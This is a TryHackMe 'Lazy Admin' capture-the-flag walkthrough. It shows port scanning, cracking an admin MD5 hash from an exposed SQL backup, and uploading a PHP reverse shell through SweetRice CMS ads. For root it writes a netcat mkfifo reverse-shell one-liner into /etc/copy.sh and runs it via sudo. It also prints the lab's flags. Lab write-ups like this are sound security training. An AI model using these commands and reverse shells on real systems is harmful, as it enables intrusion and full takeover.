# TryHackMe - Room: Lazy Admin

## Recon

`$sudo nmap -sV -sS -A 10.10.67.76`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-07 21:48 PKT
Nmap scan report for 10.10.67.76
Host is up (0.46s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=5/7%OT=22%CT=1%CU=44068%PV=Y%DS=4%DC=T%G=Y%TM=6457D686
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11
OS:NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   193.13 ms 10.4.0.1
2   ... 3
4   457.55 ms 10.10.67.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
```

## Directory Busting

- open dirbuster
- provide your machine ip
- provide extensions: php,txt,js
- provide the dirbuster wordlist file
    - `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- Start the attack

### URLs of interests

- http://10.10.144.29/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
- http://10.10.144.29:80/content/as/index.php

## Admin Credentials

From backup SQL file, credentials obtained.

|Admin|passwd|
|---|---|
|manager|42f749ade7f9e195bf475f37a44cafcb|

### Hash Cracking

`$ hashcat -m 0 md5.txt /usr/share/wordlists/rockyou.txt -o md5_cracked.txt`

```
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) m3-7Y30 CPU @ 1.00GHz, 5760/5824 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Sun May  7 23:36:47 2023 (1 sec)
Time.Estimated...: Sun May  7 23:36:48 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    98641 H/s (0.35ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 36864/14344385 (0.26%)
Rejected.........: 0/36864 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: dyesebel -> holaz

Started: Sun May  7 23:36:39 2023
Stopped: Sun May  7 23:36:49 2023
```

Review the cracked hash:

`$ cat md5_cracked.txt`

```
42f749ade7f9e195bf475f37a44cafcb:Password123
```

## Exploring the CMS

### Finding the Vulnerability

Visit the following url (make changes based on the ip of your target machine):

http://target.machine.ip:80/content/as/index.php

Provide the credentials we obtained in previous step.

**username**: manager
**password**: Password123

Usually it will be a bit confusing as what to do next, but for a hint, you can lookup the CMS name with version number.

You'll see there's vulnerability exist in this version and that is RCE. For details, in SweetRice CMS Panel **ads** section, SweetRice allows the admin to add PHP Codes in Ads File. A CSRF Vulnerabilty In adding Ads section allow attacker to execute PHP codes on server .

To make things short, there's already an exploit code available which we can use to exploit the RCE vulnerability and obtain shell 

You can download the exploit from the following link (it's also saved in the Exploit folder):

https://github.com/pentestmonkey/php-reverse-shell

Now, in the side panel, you can see there's and item *Ads*, click on that and you will be redirected to a page containing two fields.

First field requires a title of the ad, and the second one is the code you need to provide for your custom ad.

Here, let's put the name as **php_rev_shell** and in the code box, put all the code of the exploit. Make sure to change the IP and port number in the code.

IP needs to be of your machine (local machine IP provided by the VPN or if you're using attack box machine then it's IP), and the port will be the one on which your machine will be listening, because we will use netcat to listen and capture the shell.

### Getting the Reverse Shell

Now that we have created out ad, it will be saved as a .php file but to execute it, we first need to locate it. For that just visit the following URL (change the machine ip with your target machine ip):

http://target.machine.ip/content/inc/ads/

Here you will see a php file with the same name as you ad's title. But before you click on that we first need to start Netcat to listen for any reverse connection request, therefore, for that use the following command to initate netcat:

`$ nc -l -p 6565`

We set the port as `6565` for both systems to connect. Now click on the php file and go back to the terminal window, you will see a remote terminal shell initiated.


## Accessing User Data

Now that we are in the server, let's look for the users and their files/data.

`$ cd /home`

Go to `/home` directory, and list down the content, it seems there's only one user `itguy`. Let's move further and explore it's data.

```
$ cd itguy
$ ls -l
```

You will get the following result:

```
total 56
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Desktop
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Documents
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Downloads
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Music
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Pictures
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Public
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Templates
drwxr-xr-x 2 itguy itguy 4096 Nov 29  2019 Videos
-rw-r--r-x 1 root  root    47 Nov 29  2019 backup.pl
-rw-r--r-- 1 itguy itguy 8980 Nov 29  2019 examples.desktop
-rw-rw-r-- 1 itguy itguy   16 Nov 29  2019 mysql_login.txt
-rw-rw-r-- 1 itguy itguy   38 Nov 29  2019 user.txt
```

Amoung all the files, there's one particular file that seeks our attention the most, and that is **user.txt**.

That's our flag and we have the access to read the file, therefore, let's retreive it by running the following command:

`$ cat user.txt`

And you got your first flag:

**`THM{63e5bce9271952aad1113b6f1ac28a07}`**

## Priviledge Escalation

Now that we got our user flag, all that's left is to get root flag and for that we need to excalate our access to root's.

Now, let's check what commands can this user run with sudo priviledges.

```
www-data@THM-Chal:/$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

As you can see, this user can run any perl command as sudo, other than this, there's pearl script in the itguy's home directory which can be run as sudo and this user has access to that as well.

If we can look into the code if this script, we can see it is trying to run another script

```
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

We don't have the access to modify this script, then let's look into the other script try to find out what it does.

```
www-data@THM-Chal:/$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

It seems this script trying to initiate a reverse shell, what we can do here is we modify this script and add our system's ip in it, for that run the following command:

```
www-data@THM-Chal:/$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.93.55 8877 >/tmp/f" > /etc/copy.sh
```

Now, if we run the pearl script as sudo, it will then run the copy.sh script as sudo as well and this will give us a root shell in return.

But before that let's start a netcat listner on our machine:

```
$nc -l -p 8877
```

Now that our listner has started let's execute the script as sudo as following:

```
www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
```

Now go back to you netcat listner, you'll see that a remote terminal has been initiated

```
$nc -l -p 8877
/bin/sh: 0: can't access tty; job control turned off
#
```

First check for the user with which we got the access.

```
# whoami
root
```

Finally !!
Now that we have the root access, all that's left is to read the root.txt file for our final flag.

```
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

